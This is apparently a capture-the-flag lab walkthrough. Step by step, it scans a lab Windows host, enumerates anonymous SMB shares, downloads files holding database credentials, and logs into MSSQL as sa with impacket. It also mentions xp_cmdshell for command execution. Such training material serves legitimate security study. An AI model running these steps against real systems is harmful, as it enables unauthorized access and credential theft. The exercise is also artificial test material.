# Scenario 08 — Anonymous SMB Share to MSSQL Login

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02 Scanning, 03 Enumeration, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), [smbclient](../../tools/smbclient.md), [smbmap](../../tools/smbmap.md), [impacket](../../tools/impacket.md)

## Story
Target `10.10.10.77` (Windows). A sensitive document on an open share leaks DB creds. Query the `flags` table.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.77
```
**Expected finding:** 139, 445, 1433 (MSSQL).

## Step 2 — Enum SMB shares anonymously
```bash
smbmap -H 10.10.10.77 -u '' -p ''
smbclient -L //10.10.10.77/ -N
```
**Expected finding:** share `Docs` readable by anonymous.
**→ Tool refs:** [smbmap](../../tools/smbmap.md), [smbclient](../../tools/smbclient.md)

## Step 3 — Loot the share
```bash
smbclient //10.10.10.77/Docs -N
smb: \> ls
smb: \> get passwords.docx
smb: \> get db-setup.txt
smb: \> exit
```
**Expected finding:** `db-setup.txt` contains `sa / Sup3rS3cret!`.

## Step 4 — If it's a .docx, extract text
```bash
unzip -p passwords.docx word/document.xml | sed 's/<[^>]*>//g'
```
**Expected finding:** the same creds or alternate service password.

## Step 5 — Log into MSSQL
```bash
impacket-mssqlclient sa:'Sup3rS3cret!'@10.10.10.77 -windows-auth
# or
impacket-mssqlclient sa:'Sup3rS3cret!'@10.10.10.77
```
**→ Tool ref:** [impacket-mssqlclient](../../tools/impacket.md)

## Step 6 — Query the flag
```sql
SELECT name FROM sys.databases;
USE ctf;
SELECT * FROM flags;
```

## Step 7 — Final answer
**Answer format:** the flag string from the `flags` table.

## Gotchas across this chain
- smbmap returns `READ ONLY` or `READ, WRITE` per share — check both columns.
- `-N` on smbclient = no password (anonymous). Without `-N` it prompts and hangs.
- `.docx`/`.xlsx` are ZIPs — `unzip -p` beats opening them in LibreOffice.
- MSSQL `sa` + `-windows-auth` flag toggles NTLM vs SQL auth — try both.
- If `xp_cmdshell` is enabled, you get RCE: `EXEC xp_cmdshell 'whoami'`.

## Variant questions this scenario teaches you to handle
- "List SMB shares readable anonymously" → step 2.
- "Extract credentials from this .docx" → step 4.
- "Log into MSSQL as sa" → step 5.
- "Read the ctf.flags table" → full chain.
